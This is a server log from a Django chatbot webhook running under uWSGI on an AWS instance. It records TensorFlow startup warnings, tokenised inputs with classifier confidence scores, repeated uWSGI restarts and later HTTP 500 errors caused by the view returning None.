2020-09-03 05:51:26.161852: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 05:51:26.187930: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 05:51:26.188322: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56377337d600 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 05:51:26.188345: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 05:51:26.584091: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:51:26.585504: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:51:26.586873: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
2020-09-03 05:51:31.755941: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-03 05:51:32.060331: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:51:32.061792: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:51:32.063195: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
37.27%   .

[pid: 10802|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Sep  3 05:51:18 2020] POST /webhook/ => generated 39 bytes in 13599 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
37.27%   .

[pid: 10802|app: 0|req: 2/2] 66.249.83.45 () {42 vars in 540 bytes} [Thu Sep  3 05:51:32 2020] POST /webhook/ => generated 39 bytes in 65 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[66, 80, 149, 402]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  66  80 149 402]]
37.27%   .

[pid: 10802|app: 0|req: 3/3] 66.249.84.205 () {42 vars in 541 bytes} [Thu Sep  3 05:51:42 2020] POST /webhook/ => generated 39 bytes in 60 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[54, 80, 41, 74]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0 54 80 41 74]]
16.02%   .

[pid: 10802|app: 0|req: 4/4] 66.102.6.203 () {42 vars in 542 bytes} [Thu Sep  3 05:53:15 2020] POST /webhook/ => generated 38 bytes in 55 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[54, 80, 41, 74]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0 54 80 41 74]]
16.02%   .

[pid: 10802|app: 0|req: 5/5] 66.249.83.43 () {42 vars in 540 bytes} [Thu Sep  3 05:54:54 2020] POST /webhook/ => generated 38 bytes in 52 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 05:55:09 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55ad1929bd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ad1929bd00 pid: 10908 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 10908, cores: 1)
2020-09-03 05:55:22.021261: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 05:55:22.021294: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 05:55:28.410395: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 05:55:28.410429: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 05:55:28.410445: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 05:55:28.410659: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 05:55:28.435978: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 05:55:28.436366: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55ad1e40bd20 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 05:55:28.436387: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 05:55:28.725756: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:55:28.727187: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:55:28.728587: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['', '', '', '']
['', '', '', '']
[[54, 80, 41, 74]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0 54 80 41 74]]
2020-09-03 05:55:34.107868: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-03 05:55:34.592787: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:55:34.594245: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:55:34.595658: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
83.98%   .

[pid: 10908|app: 0|req: 1/1] 66.249.84.209 () {42 vars in 541 bytes} [Thu Sep  3 05:55:21 2020] POST /webhook/ => generated 38 bytes in 13140 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[54, 80, 41, 74]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0 54 80 41 74]]
83.98%   .

[pid: 10908|app: 0|req: 2/2] 66.102.6.205 () {42 vars in 540 bytes} [Thu Sep  3 05:55:34 2020] POST /webhook/ => generated 38 bytes in 66 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[54, 80, 41, 74]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0 54 80 41 74]]
83.98%   .

[pid: 10908|app: 0|req: 3/3] 66.249.83.43 () {42 vars in 540 bytes} [Thu Sep  3 05:55:34 2020] POST /webhook/ => generated 38 bytes in 59 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '', '', '']
['', '', '', '', '', '', '', '']
[[634, 8, 347, 66, 1136, 2, 104, 45]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0  634    8  347   66 1136    2
   104   45]]
96.08%   .

[pid: 10908|app: 0|req: 4/4] 66.249.83.43 () {42 vars in 542 bytes} [Thu Sep  3 05:56:02 2020] POST /webhook/ => generated 37 bytes in 67 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 05:58:29 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5579c1babd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5579c1babd00 pid: 11007 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11007, cores: 1)
2020-09-03 05:58:41.972832: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 05:58:41.972868: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 05:58:50.262574: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 05:58:50.262606: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 05:58:50.262621: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 05:58:50.262837: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 05:58:50.288065: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 05:58:50.288426: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5579c6aa6b10 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 05:58:50.288444: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 05:58:50.576942: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:58:50.578347: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:58:50.579710: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['', '', '', '', '', '', '']
['', '', '', '', '', '', '']
[[9, 348, 67, 1137, 3, 105, 46]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    9  348   67 1137    3
   105   46]]
2020-09-03 05:58:55.579850: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-03 05:58:55.888463: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 05:58:55.889938: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 05:58:55.891357: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
99.73%   .

[pid: 11007|app: 0|req: 1/1] 66.249.84.209 () {42 vars in 543 bytes} [Thu Sep  3 05:58:41 2020] POST /webhook/ => generated 38 bytes in 14483 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '', '']
['', '', '', '', '', '', '']
[[9, 348, 67, 1137, 3, 105, 46]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    9  348   67 1137    3
   105   46]]
99.73%   .

[pid: 11007|app: 0|req: 2/2] 66.249.84.209 () {42 vars in 543 bytes} [Thu Sep  3 05:58:56 2020] POST /webhook/ => generated 38 bytes in 74 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '', '']
['', '', '', '', '', '', '']
[[9, 348, 67, 1137, 3, 105, 46]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    9  348   67 1137    3
   105   46]]
99.73%   .

[pid: 11007|app: 0|req: 3/3] 66.249.84.209 () {42 vars in 543 bytes} [Thu Sep  3 05:58:56 2020] POST /webhook/ => generated 38 bytes in 62 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '', '', '']
['', '', '', '', '', '', '']
[[9, 55, 81, 42, 75, 29, 2]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  9
  55 81 42 75 29  2]]
99.62%   .

[pid: 11007|app: 0|req: 4/4] 66.249.83.41 () {42 vars in 542 bytes} [Thu Sep  3 05:59:22 2020] POST /webhook/ => generated 38 bytes in 53 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[4353]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4353]]
50.05%   .

[pid: 11007|app: 0|req: 5/5] 66.249.83.43 () {42 vars in 540 bytes} [Thu Sep  3 05:59:45 2020] POST /webhook/ => generated 39 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[55]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0  0  0  0 55]]
95.16%   .

[pid: 11007|app: 0|req: 6/6] 66.102.6.203 () {42 vars in 540 bytes} [Thu Sep  3 06:00:14 2020] POST /webhook/ => generated 38 bytes in 45 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[67]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0  0  0  0 67]]
98.40%   .

[pid: 11007|app: 0|req: 7/7] 66.102.6.201 () {42 vars in 540 bytes} [Thu Sep  3 06:00:53 2020] POST /webhook/ => generated 38 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 06:01:50 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5572311fdd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5572311fdd00 pid: 11135 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11135, cores: 1)
2020-09-03 06:12:45.790929: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 06:12:45.790968: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 06:12:54.100543: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 06:12:54.100575: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 06:12:54.100594: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 06:12:54.100878: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 06:12:54.123950: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 06:12:54.124288: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5572360f1c50 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 06:12:54.124304: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-03 06:12:54.411048: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-03 06:12:54.412493: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-03 06:12:54.413857: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
Thu Sep  3 06:12:54 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.249.83.43) !!!
Thu Sep  3 06:12:54 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.249.83.43)
OSError: write error
[pid: 11135|app: 0|req: 1/1] 66.249.83.43 () {42 vars in 540 bytes} [Thu Sep  3 06:12:45 2020] POST /webhook/ => generated 32612 bytes in 9439 msecs (HTTP/1.1 500) 5 headers in 156 bytes (0 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 11135|app: 0|req: 2/2] 66.249.83.41 () {42 vars in 542 bytes} [Thu Sep  3 06:13:09 2020] POST /webhook/ => generated 49747 bytes in 40 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 11135|app: 0|req: 3/3] 66.249.83.45 () {42 vars in 542 bytes} [Thu Sep  3 06:22:57 2020] POST /webhook/ => generated 49747 bytes in 37 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Sep  3 06:42:13 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5642c9fa4d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5642c9fa4d00 pid: 11505 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11505, cores: 1)
2020-09-03 06:42:29.029547: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-09-03 06:42:29.029581: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-09-03 06:42:37.512279: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-09-03 06:42:37.512309: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-09-03 06:42:37.512328: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-09-03 06:42:37.512537: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-09-03 06:42:37.535943: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-09-03 06:42:37.536312: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5642cee97f60 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-03 06:42:37.536332: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
